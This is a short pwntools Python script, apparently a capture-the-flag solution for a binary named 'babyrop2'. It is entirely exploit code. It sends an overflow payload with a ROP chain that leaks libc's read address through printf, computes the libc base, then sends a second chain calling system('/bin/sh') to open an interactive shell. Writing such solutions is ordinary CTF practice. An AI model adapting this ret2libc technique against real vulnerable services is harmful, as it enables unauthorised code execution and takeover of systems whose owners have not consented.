from pwn import *
# rhp = {'host': '192.168.33.20', 'port':1234}
rhp = {'host': 'localhost', 'port':45678}

conn = remote(rhp['host'], rhp['port'])

elf = ELF("./attachments/babyrop2")
libc = ELF('./attachments/libc.so.6')
offset_libc_read = libc.symbols[b'read']
offset_libc_system = libc.symbols[b'system']
offset_libc_binsh = next(libc.search('/bin/sh\x00'))

buf = p64(elf.bss(0x500))
printf_plt = p64(0x004004f0)
read_got = p64(0x601020)
pop_rdi = p64(0x00400733)
main = p64(0x400636)

log.info(conn.recv()) 
payload = b"a" * 32 + buf + pop_rdi + read_got + printf_plt + main
conn.sendline(payload)
log.info(conn.recvline())
libc_read = conn.recvuntil(b"What")[:-4].ljust(8, b"\x00")
print(libc_read)
libc_base = u64(libc_read) - offset_libc_read
libc_system = p64(libc_base + offset_libc_system)
libc_binsh = p64(libc_base + offset_libc_binsh)

payload = b"a" * 40 + pop_rdi + libc_binsh + libc_system
conn.sendline(payload)

conn.interactive()